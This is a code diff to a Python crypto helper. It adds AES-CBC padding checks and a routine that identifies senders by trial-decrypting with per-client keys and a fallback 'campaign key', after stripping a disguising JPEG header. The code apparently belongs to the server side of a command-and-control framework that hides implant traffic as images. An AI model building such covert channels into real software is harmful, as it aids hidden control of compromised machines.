@@ -66,6 +66,94 @@ class CryptoHelper:
         
         # Remove padding manually
         padding_length = padded_data[-1]
-        data = padded_data[:-padding_length]
+        if padding_length > 0 and padding_length <= 16:  # Validate the padding
+            data = padded_data[:-padding_length]
+            return data.decode('utf-8')
+        else:
+            # Invalid padding, likely wrong key
+            raise ValueError("Invalid padding in decrypted data")
+    
+    def identify_client_by_decryption(self, encrypted_data):
+        """
+        Identify client by trying each client key for decryption
         
-        return data.decode('utf-8')
+        Args:
+            encrypted_data: Encrypted data to attempt decryption on
+            
+        Returns:
+            tuple: (client_id, decrypted_data) or (None, None) if no key works
+        """
+        # Handle JPEG header if present (skip first 3 bytes if they're JPEG header)
+        try:
+            decoded_data = base64.b64decode(encrypted_data)
+            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
+                # Remove JPEG header and re-encode to base64
+                stripped_data = base64.b64encode(decoded_data[3:]).decode('utf-8')
+                logger.debug("Removed JPEG header from encrypted data")
+                encrypted_data = stripped_data
+        except Exception as e:
+            logger.debug(f"No JPEG header detected or error processing: {e}")
+        
+        # Try all client-specific keys first
+        if hasattr(self.client_manager, 'client_keys'):
+            for client_id, key in self.client_manager.client_keys.items():
+                try:
+                    # Attempt decryption with this client's key
+                    decrypted_data = self._decrypt_with_key(encrypted_data, key)
+                    
+                    # Verify the result is valid JSON
+                    try:
+                        json.loads(decrypted_data)
+                        # If we got here, decryption was successful and produced valid JSON
+                        logger.info(f"Successfully identified client {client_id} through key-based decryption")
+                        return client_id, decrypted_data
+                    except json.JSONDecodeError:
+                        # Not valid JSON, try next key
+                        continue
+                except Exception as e:
+                    # Decryption failed, try next key
+                    logger.debug(f"Decryption failed with key for client {client_id}: {e}")
+                    continue
+        
+        # If no client key worked, try the campaign key as fallback
+        try:
+            decrypted_data = self._decrypt_with_key(encrypted_data, self.crypto_manager.key)
+            # Try to parse as JSON to verify it's valid
+            try:
+                json.loads(decrypted_data)
+                logger.info("Message decrypted with campaign key - likely from a new client")
+                return None, decrypted_data  # No client ID, but decryption succeeded
+            except json.JSONDecodeError:
+                pass
+        except Exception as e:
+            logger.debug(f"Campaign key decryption attempt failed: {e}")
+        
+        # If we got here, no key worked
+        logger.warning("Failed to identify client - no key could decrypt the data")
+        return None, None
+
+    def _decrypt_with_key(self, encrypted_data, key):
+        """Decrypt data using a specific key"""
+        try:
+            # Decode the base64
+            encrypted_bytes = base64.b64decode(encrypted_data)
+            
+            # Extract the IV and ciphertext
+            iv = encrypted_bytes[:16]
+            ciphertext = encrypted_bytes[16:]
+            
+            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+            decryptor = cipher.decryptor()
+            padded_data = decryptor.update(ciphertext) + decryptor.finalize()
+            
+            # Remove padding manually
+            padding_length = padded_data[-1]
+            if padding_length > 0 and padding_length <= 16:  # Valid padding values
+                data = padded_data[:-padding_length]
+                return data.decode('utf-8')
+            else:
+                # Invalid padding, likely wrong key
+                raise ValueError("Invalid padding")
+        except Exception as e:
+            # Catch all decryption errors
+            raise
